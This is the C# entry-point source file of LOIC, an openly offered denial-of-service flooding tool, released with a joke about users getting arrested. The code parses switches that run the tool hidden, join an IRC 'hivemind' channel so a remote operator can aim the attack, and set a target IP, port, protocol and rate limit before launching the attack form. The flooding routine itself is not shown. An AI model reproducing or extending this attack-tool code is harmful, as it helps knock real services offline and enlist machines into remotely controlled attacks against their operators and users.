/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Windows.Forms;

namespace LOIC
{
	static class Program
	{
		[STAThread]
		static void Main(string[] cmdLine)
		{
			bool hive = false, hide = false;
			string ircserver = "", ircport = "", ircchannel = "";
			string targetIP = "127.0.0.1", targetPort = "80", protocol = "0";
			string limits = "0";

			int count = 0;
			foreach(string s in cmdLine)
			{
				if(s.ToLowerInvariant() == "/hidden") {
					hide = true;
				}

				// IRC
				if(s.ToLowerInvariant() == "/hivemind") {
					hive = true;
					ircserver = cmdLine[count + 1]; //if no server entered let it crash
					try {ircport = cmdLine[count + 2];}
					catch(Exception) {ircport = "6667";} //default
					try {ircchannel = cmdLine[count + 3];}
					catch(Exception) {ircchannel = "#loic";} //default
				}

				if(s.ToLowerInvariant() == "/target") {
					targetIP = cmdLine[count + 1];
					try {targetPort = cmdLine[count + 2];}
					catch(Exception) {targetPort = "80";}
					try {protocol = cmdLine[count + 3];}
					catch(Exception) {protocol = "0";}
				}
				if(s.ToLowerInvariant() == "/limit") {
					limits = cmdLine[count + 1];
				}

				count++;
			}

			System.Console.WriteLine("Target IP Address: {0} \n",targetIP);
			System.Console.WriteLine("Target Port: {0} \n",targetPort);
			System.Console.WriteLine("Protocol: {0} \n",protocol);
			System.Console.WriteLine("Limits: {0} \n",limits);
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new frmMain(hive, hide, ircserver, ircport, ircchannel, targetIP, targetPort, protocol,limits));
		}
	}
}
